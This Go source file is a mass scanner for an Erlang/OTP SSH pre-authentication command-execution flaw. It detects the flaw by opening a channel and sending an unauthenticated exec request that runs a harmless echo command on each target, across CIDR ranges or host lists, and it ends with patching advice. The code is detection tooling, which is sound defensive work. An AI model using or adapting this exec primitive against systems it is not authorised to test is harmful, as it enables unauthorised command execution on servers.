package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Configuration options
type Config struct {
	Target          string
	HostFile        string
	Port            int
	Threads         int
	Timeout         int
	Verbose         bool
	Debug           bool          // Enable debug output
	OutputFile      string
	OutputJSON      bool
	ReadTimeout     time.Duration
	WriteTimeout    time.Duration
	ConnectTimeout  time.Duration
	RetryCount      int           // Number of connection attempts before giving up
	Delay           int           // Milliseconds to delay between tests
	SkipBannerCheck bool          // Skip Erlang banner check (test all SSH servers)
	StrictMode      bool          // Stricter detection to reduce false positives
	RPS             int           // Rate limit: requests per second (0 = unlimited)
	FollowRedirects bool          // Follow IP redirects (e.g., DNS round-robin)
	CIDR            string        // CIDR notation for subnet scanning (e.g., 192.168.1.0/24)
}

// Result stores scan results for each host
type Result struct {
	Host        string
	Port        int
	Vulnerable  bool
	ErlangFound bool
	Banner      string
	Error       string
	Details     string // Additional details about vulnerability status
}

// SSHMessage types
const (
	SSH_MSG_DISCONNECT          = 1
	SSH_MSG_IGNORE              = 2
	SSH_MSG_UNIMPLEMENTED       = 3
	SSH_MSG_DEBUG               = 4
	SSH_MSG_SERVICE_REQUEST     = 5
	SSH_MSG_SERVICE_ACCEPT      = 6
	SSH_MSG_KEXINIT             = 20
	SSH_MSG_NEWKEYS             = 21
	SSH_MSG_CHANNEL_OPEN        = 90
	SSH_MSG_CHANNEL_OPEN_CONFIRMATION = 91
	SSH_MSG_CHANNEL_OPEN_FAILURE = 92
	SSH_MSG_CHANNEL_WINDOW_ADJUST = 93
	SSH_MSG_CHANNEL_DATA        = 94
	SSH_MSG_CHANNEL_EOF         = 96
	SSH_MSG_CHANNEL_CLOSE       = 97
	SSH_MSG_CHANNEL_REQUEST     = 98
	SSH_MSG_CHANNEL_SUCCESS     = 99
	SSH_MSG_CHANNEL_FAILURE     = 100
)

// buildSshString - Creates an SSH string with 4-byte length prefix
func buildSshString(s string) []byte {
	data := []byte(s)
	result := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(result, uint32(len(data)))
	copy(result[4:], data)
	return result
}

// wrapPacket - Wraps the payload into an SSH packet with padding
func wrapPacket(payload []byte) []byte {
	blockSize := 8
	paddingLength := blockSize - ((len(payload) + 5) % blockSize)
	if paddingLength < 4 {
		paddingLength += blockSize
	}

	padding := make([]byte, paddingLength)
	rand.Read(padding)

	packetLength := len(payload) + paddingLength + 1
	packet := make([]byte, 4+1+len(payload)+paddingLength)
	binary.BigEndian.PutUint32(packet[0:4], uint32(packetLength))
	packet[4] = byte(paddingLength)
	copy(packet[5:], payload)
	copy(packet[5+len(payload):], padding)

	return packet
}

// buildKexinitPacket - Creates an SSH key exchange init packet
func buildKexinitPacket() []byte {
	msgType := []byte{SSH_MSG_KEXINIT} // SSH_MSG_KEXINIT

	cookie := make([]byte, 16)
	rand.Read(cookie)

	// Use a more focused set of algorithms that are commonly supported
	kexAlgorithms := buildSshString("curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256")
	hostKeyAlgorithms := buildSshString("ssh-ed25519,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521")
	encryptionAlgorithms := buildSshString("chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com")
	macAlgorithms := buildSshString("hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1")
	compressionAlgorithms := buildSshString("none,zlib@openssh.com,zlib")
	emptyString := buildSshString("")

	firstKexPacketFollows := []byte{0x00}
	reserved := []byte{0x00, 0x00, 0x00, 0x00}

	payload := append(msgType, cookie...)
	payload = append(payload, kexAlgorithms...)
	payload = append(payload, hostKeyAlgorithms...)
	payload = append(payload, encryptionAlgorithms...) // c->s
	payload = append(payload, encryptionAlgorithms...) // s->c
	payload = append(payload, macAlgorithms...) // c->s
	payload = append(payload, macAlgorithms...) // s->c
	payload = append(payload, compressionAlgorithms...) // c->s
	payload = append(payload, compressionAlgorithms...) // s->c
	payload = append(payload, emptyString...) // languages c->s
	payload = append(payload, emptyString...) // languages s->c
	payload = append(payload, firstKexPacketFollows...)
	payload = append(payload, reserved...)

	return wrapPacket(payload)
}

// buildChannelOpen - Creates a channel open packet
func buildChannelOpen() []byte {
	msgType := []byte{SSH_MSG_CHANNEL_OPEN} // SSH_MSG_CHANNEL_OPEN
	channelType := buildSshString("session")
	senderChannel := make([]byte, 4)
	binary.BigEndian.PutUint32(senderChannel, 0)
	initialWindowSize := make([]byte, 4)
	binary.BigEndian.PutUint32(initialWindowSize, 0x68000)
	maxPacketSize := make([]byte, 4)
	binary.BigEndian.PutUint32(maxPacketSize, 0x10000)

	payload := append(msgType, channelType...)
	payload = append(payload, senderChannel...)
	payload = append(payload, initialWindowSize...)
	payload = append(payload, maxPacketSize...)

	return wrapPacket(payload)
}

// buildChannelRequest - Creates a channel request packet with a command
func buildChannelRequest(command string) []byte {
	msgType := []byte{SSH_MSG_CHANNEL_REQUEST} // SSH_MSG_CHANNEL_REQUEST
	recipientChannel := make([]byte, 4)
	binary.BigEndian.PutUint32(recipientChannel, 0)
	requestType := buildSshString("exec")
	wantReply := []byte{0x01}
	cmd := buildSshString(command)

	payload := append(msgType, recipientChannel...)
	payload = append(payload, requestType...)
	payload = append(payload, wantReply...)
	payload = append(payload, cmd...)

	return wrapPacket(payload)
}

// parsePacket parses a raw SSH packet and extracts the message type and payload
func parsePacket(data []byte) (byte, []byte, error) {
	if len(data) < 6 {
		return 0, nil, errors.New("packet too short")
	}

	packetLength := binary.BigEndian.Uint32(data[0:4])
	paddingLength := data[4]

	if len(data) < int(packetLength+4) {
		return 0, nil, errors.New("incomplete packet")
	}

	payloadLength := int(packetLength) - int(paddingLength) - 1
	if payloadLength < 1 {
		return 0, nil, errors.New("no payload in packet")
	}

	payload := data[5 : 5+payloadLength]
	if len(payload) < 1 {
		return 0, nil, errors.New("empty payload")
	}

	msgType := payload[0]
	return msgType, payload, nil
}

// generateUniqueMarker generates a unique marker for testing
func generateUniqueMarker() string {
	randBytes := make([]byte, 6)
	rand.Read(randBytes)
	return fmt.Sprintf("ERLVULN_%x", randBytes)
}

// testHost tests a single host for the vulnerability with improved detection
func testHost(host string, port int, config Config) Result {
	result := Result{
		Host:       host,
		Port:       port,
		Vulnerable: false,
	}

	// Try multiple times if configured, but do one run in strict mode first
	// This helps eliminate false positives by starting with a conservative test
	originalStrictMode := config.StrictMode
	config.StrictMode = true
	testResult, err := attemptVulnerabilityTest(host, port, config)
	if err == nil && testResult.Vulnerable {
		// If we detected vulnerability in strict mode, it's very likely genuine
		return testResult
	}

	// Restore original strict mode setting for remaining tests
	config.StrictMode = originalStrictMode

	// Continue with regular testing if needed
	var lastErr error
	for attempt := 0; attempt <= config.RetryCount; attempt++ {
		if attempt > 0 {
			if config.Verbose {
				fmt.Printf("[*] Retrying %s:%d (attempt %d/%d)\n", host, port, attempt, config.RetryCount)
			}
			time.Sleep(time.Duration(500) * time.Millisecond)
		}

		testResult, err := attemptVulnerabilityTest(host, port, config)
		if err == nil {
			return testResult
		}
		lastErr = err

		// Don't retry certain errors
		if strings.Contains(err.Error(), "connection refused") || 
		   strings.Contains(err.Error(), "no route to host") {
			break
		}
	}

	if lastErr != nil {
		result.Error = fmt.Sprintf("Error after %d attempts: %v", config.RetryCount+1, lastErr)
	}

	return result
}

// attemptVulnerabilityTest performs a single vulnerability test
func attemptVulnerabilityTest(host string, port int, config Config) (Result, error) {
	result := Result{
		Host: host,
		Port: port,
	}

	// Create connection with timeout
	dialer := net.Dialer{
		Timeout: config.ConnectTimeout,
	}
	
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return result, fmt.Errorf("connection error: %v", err)
	}
	defer conn.Close()

	// Set timeouts for further operations
	conn.SetReadDeadline(time.Now().Add(config.ReadTimeout))
	conn.SetWriteDeadline(time.Now().Add(config.WriteTimeout))

	// ===== STAGE 1: Banner Exchange =====
	bannerBuf := make([]byte, 256)
	n, err := conn.Read(bannerBuf)
	if err != nil && err != io.EOF {
		return result, fmt.Errorf("error reading banner: %v", err)
	}

	banner := string(bannerBuf[:n])
	result.Banner = strings.TrimSpace(banner)

	// Check if this appears to be an SSH server at all
	if !strings.HasPrefix(banner, "SSH-") {
		return result, errors.New("not an SSH server")
	}

	// Check if this is an Erlang SSH server
	isErlangSSH := strings.Contains(banner, "SSH-2.0-Erlang")
	result.ErlangFound = isErlangSSH

	// If not an Erlang server and we're not skipping the banner check, return early
	if !isErlangSSH && !config.SkipBannerCheck {
		if config.Verbose {
			fmt.Printf("[-] Not an Erlang SSH server: %s:%d\n", host, port)
		}
		return result, nil
	}

	if isErlangSSH && config.Verbose {
		fmt.Printf("[+] Found Erlang SSH server: %s:%d\n", host, port)
	}

	// ===== STAGE 2: Key Exchange Initiation =====
	// Send client banner
	clientBanner := []byte("SSH-2.0-ErlangVulnScanner\r\n")
	_, err = conn.Write(clientBanner)
	if err != nil {
		return result, fmt.Errorf("error sending client banner: %v", err)
	}

	// Delay to allow server to process
	time.Sleep(time.Duration(config.Delay) * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(config.ReadTimeout))

	// Send KEXINIT packet
	kexinitPacket := buildKexinitPacket()
	_, err = conn.Write(kexinitPacket)
	if err != nil {
		return result, fmt.Errorf("error sending KEXINIT: %v", err)
	}

	// Read server's KEXINIT response
	kexResponseBuf := make([]byte, 1024)
	_, err = conn.Read(kexResponseBuf)
	if err != nil && err != io.EOF && !errors.Is(err, os.ErrDeadlineExceeded) {
		// Only consider non-timeout errors as failures
		return result, fmt.Errorf("error reading KEXINIT response: %v", err)
	}

	// Delay to allow server to process
	time.Sleep(time.Duration(config.Delay) * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(config.ReadTimeout))

	// ===== STAGE 3: Vulnerability Testing =====
	// Generate unique marker to identify this test
	marker := generateUniqueMarker()

	// Send CHANNEL_OPEN early (before authentication)
	channelOpenPacket := buildChannelOpen()
	_, err = conn.Write(channelOpenPacket)
	if err != nil {
		return result, fmt.Errorf("error sending CHANNEL_OPEN: %v", err)
	}

	// Delay to allow server to process
	time.Sleep(time.Duration(config.Delay) * time.Millisecond)
	conn.SetReadDeadline(time.Now().Add(config.ReadTimeout))

	// Send CHANNEL_REQUEST with test command that includes our unique marker
	testCommand := fmt.Sprintf("echo %s", marker)
	channelRequestPacket := buildChannelRequest(testCommand)
	_, err = conn.Write(channelRequestPacket)
	if err != nil {
		return result, fmt.Errorf("error sending CHANNEL_REQUEST: %v", err)
	}

	// ===== STAGE 4: Response Analysis =====
	// Read multiple responses to catch all server messages
	var fullResponse []byte
	responseBuf := make([]byte, 1024)

	// Try to read multiple times with short timeouts
	for i := 0; i < 3; i++ {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err = conn.Read(responseBuf)
		if err != nil {
			if err != io.EOF && !errors.Is(err, os.ErrDeadlineExceeded) {
				// Log non-timeout errors in verbose mode
				if config.Verbose {
					fmt.Printf("[*] Read error: %s:%d - %v\n", host, port, err)
				}
			}
			break
		}
		if n > 0 {
			fullResponse = append(fullResponse, responseBuf[:n]...)
		}
	}

	// ===== STAGE 5: Vulnerability Determination =====
	result.Vulnerable = false
	details := []string{}

	if len(fullResponse) > 0 {
		// Evidence of non-vulnerability: explicit rejection messages
		rejectionSignals := [][]byte{
			[]byte("Protocol error"),
			[]byte("SSH_MSG_DISCONNECT"),
			[]byte("channel request failed"),
			[]byte("Connection closed"),
			[]byte("Authentication required"),
			[]byte("authentication failure"),
			[]byte("channel 0 not found"),
			[]byte("Not connected"),
			[]byte("connection reset"),
			[]byte("Permission denied"),
			[]byte("Access denied"),
			[]byte("Invalid authentication"),
		}

		for _, signal := range rejectionSignals {
			if bytes.Contains(fullResponse, signal) {
				details = append(details, fmt.Sprintf("Server rejected with: %s", signal))
				result.Details = strings.Join(details, "; ")
				return result, nil
			}
		}

		// Strong evidence of vulnerability: our marker returned or channel success
		markerBytes := []byte(marker)
		if bytes.Contains(fullResponse, markerBytes) {
			// Double-check that it's actually our marker and not a coincidence
			// by verifying the marker appears exactly as expected
			if bytes.Contains(fullResponse, []byte(fmt.Sprintf("echo %s", marker))) || 
			   bytes.Contains(fullResponse, []byte(fmt.Sprintf("%s\r\n", marker))) || 
			   bytes.Contains(fullResponse, []byte(fmt.Sprintf("%s\n", marker))) {
				result.Vulnerable = true
				details = append(details, fmt.Sprintf("Command output contains our marker: %s", marker))
			}
		}

		// Binary packet analysis for more subtle signals
		// Attempt to parse the response as SSH packets
		offset := 0
		packetCount := 0
		for offset < len(fullResponse) && packetCount < 10 { // Limit analysis to 10 packets to avoid excessive processing
			// Need at least 4 bytes to read packet length
			if offset+4 > len(fullResponse) {
				break
			}
			
			packetLength := binary.BigEndian.Uint32(fullResponse[offset:offset+4])
			if packetLength > 35000 || packetLength < 5 { // Sanity check
				offset++
				continue
			}
			
			// Check if we have the full packet
			if offset+int(packetLength)+4 > len(fullResponse) {
				break
			}
			
			msgType, payload, err := parsePacket(fullResponse[offset:])
			if err == nil {
				switch msgType {
				case SSH_MSG_CHANNEL_OPEN_CONFIRMATION:
					// Only consider this as strong evidence when combined with other signals
					details = append(details, "Server accepted channel open")
				case SSH_MSG_CHANNEL_SUCCESS:
					result.Vulnerable = true
					details = append(details, "Server indicated channel success")
				case SSH_MSG_CHANNEL_DATA:
					// Check the data content for conclusive evidence
					if len(payload) > 9 { // At minimum: msgType(1) + channelId(4) + dataLen(4)
						dataLen := binary.BigEndian.Uint32(payload[5:9])
						if 9+int(dataLen) <= len(payload) {
							dataContent := payload[9:9+int(dataLen)]
							
							// Only mark as vulnerable if the data contains our marker
							if bytes.Contains(dataContent, []byte(marker)) {
								result.Vulnerable = true
								details = append(details, fmt.Sprintf("Received data containing marker: %s", string(dataContent)))
							} else {
								details = append(details, fmt.Sprintf("Received data: %s", string(dataContent)))
							}
						}
					}
				}
			}
			
			// Move to next packet
			offset += int(packetLength) + 4
			packetCount++
		}
	}

	// In strict mode, if we haven't seen definitive evidence of vulnerability, mark as not vulnerable
	if config.StrictMode {
		// If we only have weak evidence, don't mark as vulnerable
		if len(details) > 0 && !result.Vulnerable {
			result.Vulnerable = false
			details = append(details, "Found some signals but no conclusive evidence (strict mode)")
		} else if len(details) == 0 {
			result.Vulnerable = false
			details = append(details, "No definitive evidence of vulnerability in strict mode")
		}
	}

	result.Details = strings.Join(details, "; ")
	
	// If we haven't determined vulnerability status yet, and we have no evidence either way
	if len(details) == 0 {
		// Even in non-strict mode, don't mark as vulnerable without evidence
		// This is a key change to reduce false positives
		result.Vulnerable = false
		result.Details = "No evidence of vulnerability found"
	}

	return result, nil
}

// processHosts reads hosts from file and adds them to the scan queue
// Returns the number of hosts added and any error
func processHosts(hostFile string, scanQueue chan<- string) (int, error) {
	file, err := os.Open(hostFile)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	count := 0
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		host := strings.TrimSpace(scanner.Text())
		if host != "" && !strings.HasPrefix(host, "#") {
			scanQueue <- host
			count++
		}
	}

	return count, scanner.Err()
}

// expandCIDR expands a CIDR notation into a list of IP addresses
func expandCIDR(cidr string) ([]string, error) {
	// Parse CIDR notation
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	
	// Get the network and broadcast addresses
	network := ipNet.IP
	
	// Create a 4-byte array to represent our IP address
	ip := make(net.IP, len(network))
	copy(ip, network)
	
	// Calculate the number of hosts in this CIDR
	var hosts []string
	
	// Handle special cases for IPv4
	if len(ip) == 16 && isIPv4(ip) {
		// This is an IPv4 address represented as IPv6
		// Remove the IPv6 prefix and only keep the last 4 bytes
		ip = ip[12:]
		network = network[12:]
	}
	
	// Calculate the subnet mask bits
	ones, bits := ipNet.Mask.Size()
	hostBits := bits - ones
	
	// Limit expansion to avoid excessive memory usage
	if hostBits > 16 {
		return nil, fmt.Errorf("CIDR range is too large (%d hosts). Please use a smaller range (max /16 for IPv4)", 1<<hostBits)
	}
	
	// Generate all IP addresses in the CIDR block
	for i := uint32(0); i < 1<<hostBits; i++ {
		// Create a copy of the base IP
		newIP := make(net.IP, len(ip))
		copy(newIP, ip)
		
		// Add the host part to the IP
		for j := len(newIP) - 1; j >= 0; j-- {
			newIP[j] = ip[j] | byte(i>>(8*(len(newIP)-j-1))&0xff)
		}
		
		// Skip network and broadcast addresses for IPv4
		if !isIPv4(newIP) || (i > 0 && i < (1<<hostBits)-1) {
			hosts = append(hosts, newIP.String())
		}
	}
	
	return hosts, nil
}

// isIPv4 checks if an IP address is IPv4
func isIPv4(ip net.IP) bool {
	return ip.To4() != nil
}

// writeResults writes the scan results to a file
func writeResults(results []Result, filename string, jsonFormat bool) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	
	if jsonFormat {
		// Write JSON format
		writer.WriteString("[\n")
		for i, result := range results {
			jsonLine := fmt.Sprintf("  {\"host\":\"%s\",\"port\":%d,\"vulnerable\":%t,\"erlangFound\":%t,\"banner\":\"%s\",\"error\":\"%s\",\"details\":\"%s\"}",
				escapeJSON(result.Host),
				result.Port,
				result.Vulnerable,
				result.ErlangFound,
				escapeJSON(result.Banner),
				escapeJSON(result.Error),
				escapeJSON(result.Details))
				
			writer.WriteString(jsonLine)
			if i < len(results)-1 {
				writer.WriteString(",\n")
			} else {
				writer.WriteString("\n")
			}
		}
		writer.WriteString("]\n")
	} else {
		// Write CSV format
		writer.WriteString("Host,Port,Vulnerable,ErlangFound,Banner,Error,Details\n")
		
		for _, result := range results {
			vulnStatus := "No"
			if result.Vulnerable {
				vulnStatus = "Yes"
			}
			
			erlangStatus := "No"
			if result.ErlangFound {
				erlangStatus = "Yes"
			}
			
			cleanBanner := strings.ReplaceAll(result.Banner, ",", "_")
			cleanError := strings.ReplaceAll(result.Error, ",", "_")
			cleanDetails := strings.ReplaceAll(result.Details, ",", "_")
			
			line := fmt.Sprintf("%s,%d,%s,%s,%s,%s,%s\n", 
				result.Host, 
				result.Port, 
				vulnStatus, 
				erlangStatus,
				cleanBanner,
				cleanError,
				cleanDetails)
			
			writer.WriteString(line)
		}
	}
	
	return writer.Flush()
}

// escapeJSON escapes special characters in JSON strings
func escapeJSON(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	s = strings.ReplaceAll(s, "\t", "\\t")
	return s
}

// createRateLimiter creates a rate limiter channel
func createRateLimiter(rps int) chan struct{} {
	rate := time.Second / time.Duration(rps)
	throttle := make(chan struct{}, 100)
	
	go func() {
		ticker := time.NewTicker(rate)
		defer ticker.Stop()
		
		for range ticker.C {
			select {
			case throttle <- struct{}{}:
			default:
			}
		}
	}()
	
	return throttle
}

// sort package is already imported at the top

// analyzeResults prints a summary of scan results
func analyzeResults(results []Result) {
	var vulnerableCount, erlangCount, totalCount, errorCount int
	var vulnerableHosts []string
	var vulnerabilityDetails = make(map[string]int)
	
	for _, r := range results {
		totalCount++
		if r.ErlangFound {
			erlangCount++
		}
		if r.Error != "" {
			errorCount++
		}
		if r.Vulnerable {
			vulnerableCount++
			vulnerableHosts = append(vulnerableHosts, fmt.Sprintf("%s:%d", r.Host, r.Port))
			
			// Count vulnerability evidence types
			if r.Details != "" {
				details := strings.Split(r.Details, "; ")
				for _, detail := range details {
					vulnerabilityDetails[detail]++
				}
			}
		}
	}
	
	// Sort vulnerable hosts for nicer output
	sort.Strings(vulnerableHosts)
	
	fmt.Println("\n-----------------------------------------------------")
	fmt.Printf("Scan Summary:\n")
	fmt.Printf("- Total hosts scanned: %d\n", totalCount)
	fmt.Printf("- Connection errors: %d (%.1f%%)\n", 
		errorCount, percentage(errorCount, totalCount))
	
	if erlangCount > 0 {
		erlangPercent := percentage(erlangCount, totalCount)
		fmt.Printf("- Erlang SSH servers found: %d (%.1f%%)\n", erlangCount, erlangPercent)
		
		if vulnerableCount > 0 {
			vulnPercent := percentage(vulnerableCount, erlangCount)
			fmt.Printf("- Vulnerable servers: %d (%.1f%% of Erlang servers)\n", 
				vulnerableCount, vulnPercent)
			
			// Show vulnerability evidence types if we have them
			if len(vulnerabilityDetails) > 0 {
				fmt.Println("\nVulnerability evidence types:")
				
				// Convert to slice for sorting
				type evidenceCount struct {
					evidence string
					count    int
				}
				
				var evidenceCounts []evidenceCount
				for evidence, count := range vulnerabilityDetails {
					evidenceCounts = append(evidenceCounts, evidenceCount{evidence, count})
				}
				
				// Sort by count (descending)
				sort.Slice(evidenceCounts, func(i, j int) bool {
					return evidenceCounts[i].count > evidenceCounts[j].count
				})
				
				// Print top 5 evidence types
				for i, ec := range evidenceCounts {
					if i >= 5 {
						break
					}
					fmt.Printf("- %s: %d (%.1f%% of vulnerable servers)\n", 
						ec.evidence, ec.count, percentage(ec.count, vulnerableCount))
				}
			}
		} else {
			fmt.Printf("- Vulnerable servers: 0\n")
		}
	} else {
		fmt.Printf("- Erlang SSH servers found: 0\n")
		fmt.Printf("- Vulnerable servers: 0\n")
	}
	
	if vulnerableCount > 0 {
		fmt.Println("\nVulnerable hosts:")
		// Print up to 20 hosts directly
		limit := 20
		if len(vulnerableHosts) < limit {
			limit = len(vulnerableHosts)
		}
		
		for i := 0; i < limit; i++ {
			fmt.Printf("- %s\n", vulnerableHosts[i])
		}
		
		if len(vulnerableHosts) > limit {
			fmt.Printf("- ... and %d more (see output file for complete list)\n", 
				len(vulnerableHosts) - limit)
		}
	}
}

// percentage calculates the percentage of part in total
func percentage(part, total int) float64 {
	if total == 0 {
		return 0.0
	}
	return float64(part) * 100.0 / float64(total)
}

func main() {
	fmt.Println("Erlang/OTP SSH Early Command Execution Vulnerability Scanner")
	fmt.Println("Version 2.1 - Enhanced Performance and Accuracy")
	fmt.Println("-----------------------------------------------------")
	
	// Parse command line flags
	config := Config{}
	
	flag.StringVar(&config.Target, "target", "", "Single target to scan (e.g., 192.168.1.1)")
	flag.StringVar(&config.HostFile, "file", "", "File containing list of targets")
	flag.StringVar(&config.CIDR, "cidr", "", "CIDR range to scan (e.g., 192.168.1.0/24)")
	flag.IntVar(&config.Port, "port", 22, "Port to scan")
	flag.IntVar(&config.Threads, "threads", 10, "Number of concurrent threads")
	flag.IntVar(&config.Timeout, "timeout", 5, "Timeout in seconds")
	flag.BoolVar(&config.Verbose, "verbose", false, "Enable verbose output")
	flag.BoolVar(&config.Debug, "debug", false, "Enable debug logging (more detailed than verbose)")
	flag.StringVar(&config.OutputFile, "output", "", "Output results to file")
	flag.BoolVar(&config.OutputJSON, "json", false, "Output in JSON format instead of CSV")
	flag.IntVar(&config.RetryCount, "retries", 2, "Number of connection attempts before giving up")
	flag.IntVar(&config.Delay, "delay", 300, "Milliseconds to delay between tests")
	flag.BoolVar(&config.SkipBannerCheck, "all-ssh", false, "Test all SSH servers, not just Erlang")
	flag.BoolVar(&config.StrictMode, "strict", true, "Use stricter detection to reduce false positives")
	flag.IntVar(&config.RPS, "rps", 0, "Rate limit: requests per second (0 = unlimited)")
	flag.BoolVar(&config.FollowRedirects, "follow-redirects", false, "Follow IP redirects when scanning")
	
	flag.Parse()
	
	// Set timeouts
	config.ReadTimeout = time.Duration(config.Timeout) * time.Second
	config.WriteTimeout = time.Duration(config.Timeout) * time.Second
	config.ConnectTimeout = time.Duration(config.Timeout) * time.Second

	// Validate input parameters
	if config.Target == "" && config.HostFile == "" && config.CIDR == "" {
		fmt.Println("Error: Either -target, -file, or -cidr must be specified")
		flag.Usage()
		os.Exit(1)
	}
	
	// Add CIDR processing if specified
	if config.CIDR != "" {
		hosts, err := expandCIDR(config.CIDR)
		if err != nil {
			fmt.Printf("Error expanding CIDR range %s: %v\n", config.CIDR, err)
			os.Exit(1)
		}
		fmt.Printf("CIDR range expanded to %d hosts\n", len(hosts))
		
		// Create a temporary file with the hosts
		tempFile, err := os.CreateTemp("", "cidr-hosts-*.txt")
		if err != nil {
			fmt.Printf("Error creating temporary file: %v\n", err)
			os.Exit(1)
		}
		defer os.Remove(tempFile.Name())
		
		for _, host := range hosts {
			tempFile.WriteString(host + "\n")
		}
		tempFile.Close()
		
		// Set the host file to the temporary file
		config.HostFile = tempFile.Name()
	}
	
	// Adjust thread count based on number of CPUs if needed
	if config.Threads > runtime.NumCPU()*4 && runtime.NumCPU() > 1 {
		suggestedThreads := runtime.NumCPU() * 4
		fmt.Printf("Warning: High thread count (%d) might cause performance issues.\n", config.Threads)
		fmt.Printf("Suggestion: Consider using -threads=%d for optimal performance.\n", suggestedThreads)
	}
	
	scanQueue := make(chan string, 1000)
	resultQueue := make(chan Result, 1000)
	var wg sync.WaitGroup
	
	// Create rate limiter if specified
	var throttle chan struct{}
	if config.RPS > 0 {
		throttle = createRateLimiter(config.RPS)
		fmt.Printf("Rate limiting enabled: %d requests per second\n", config.RPS)
	}
	
	// Show config summary
	fmt.Printf("Port: %d, Threads: %d, Timeout: %ds, Retries: %d\n", 
		config.Port, config.Threads, config.Timeout, config.RetryCount)
	if config.StrictMode {
		fmt.Println("Detection mode: Strict (reduces false positives)")
	} else {
		fmt.Println("Detection mode: Standard (may include potential false positives)")
	}
	
	// Start worker goroutines
	startTime := time.Now()
	fmt.Printf("Starting scan at %s\n", startTime.Format("15:04:05"))
	
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range scanQueue {
				// Apply rate limiting if enabled
				if throttle != nil {
					<-throttle
				}
				
				result := testHost(host, config.Port, config)
				resultQueue <- result
			}
		}()
	}
	
	// Start goroutine to close resultQueue when all workers are done
	go func() {
		wg.Wait()
		close(resultQueue)
	}()
	
	// Add hosts to scan queue
	var totalHosts int
	
	if config.Target != "" {
		scanQueue <- config.Target
		totalHosts++
	}
	
	if config.HostFile != "" {
		hostCount, err := processHosts(config.HostFile, scanQueue)
		if err != nil {
			fmt.Printf("Error reading host file: %v\n", err)
			os.Exit(1)
		}
		totalHosts += hostCount
	}
	
	fmt.Printf("Added %d hosts to scan queue\n", totalHosts)
	
	// Adjust thread count based on total hosts if needed
	if totalHosts < config.Threads {
		newThreads := totalHosts
		if newThreads < 1 {
			newThreads = 1
		}
		fmt.Printf("Adjusting thread count from %d to %d based on number of hosts\n", 
			config.Threads, newThreads)
		config.Threads = newThreads
	}
	// Close the scan queue to signal workers
	close(scanQueue)

	// Collect and process results
	var vulnerable, erlangCount, total, errors int32
	resultsChan := make(chan Result, config.Threads)

	fmt.Println("-----------------------------------------------------")
	fmt.Println("Scanning in progress. Results will appear below:")

	// Start a goroutine to collect results and update counters
	go func() {
		for result := range resultQueue {
			atomic.AddInt32(&total, 1)

			if result.ErlangFound {
				atomic.AddInt32(&erlangCount, 1)
			}

			if result.Error != "" {
				atomic.AddInt32(&errors, 1)
			}

			if result.Vulnerable {
				atomic.AddInt32(&vulnerable, 1)
				fmt.Printf("[VULNERABLE] %s:%d - Erlang SSH server vulnerable to early command execution\n", result.Host, result.Port)
				if config.Verbose && result.Details != "" {
					fmt.Printf("             Details: %s\n", result.Details)
				}
			} else if result.ErlangFound {
				fmt.Printf("[SECURE] %s:%d - Erlang SSH server not vulnerable\n", result.Host, result.Port)
				if config.Verbose && result.Details != "" {
					fmt.Printf("        Details: %s\n", result.Details)
				}
			} else if result.Error != "" && config.Verbose {
				fmt.Printf("[ERROR] %s:%d - %s\n", result.Host, result.Port, result.Error)
			}

			// Store results for later processing
			resultsChan <- result
		}
		close(resultsChan)
	}()

	// Collect all results
	results := []Result{}
	for result := range resultsChan {
		results = append(results, result)
	}

	// Analyze and print summary
	analyzeResults(results)

	// Print scan duration
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	fmt.Printf("\nScan completed in %s\n", duration.Round(time.Second))
	
	// Write results to file if specified
	if config.OutputFile != "" {
		err := writeResults(results, config.OutputFile, config.OutputJSON)
		if err != nil {
			fmt.Printf("Error writing results to file: %v\n", err)
		} else {
			fmt.Printf("Results saved to: %s\n", config.OutputFile)
		}
	}
	
	// Print recommendations based on results
	if vulnerable > 0 {
		fmt.Println("\nRECOMMENDATIONS:")
		fmt.Println("- Update vulnerable Erlang/OTP installations to the latest version")
		fmt.Println("- If immediate updates are not possible, restrict access to SSH ports")
		fmt.Println("- Review logs for signs of exploitation")
	}
}
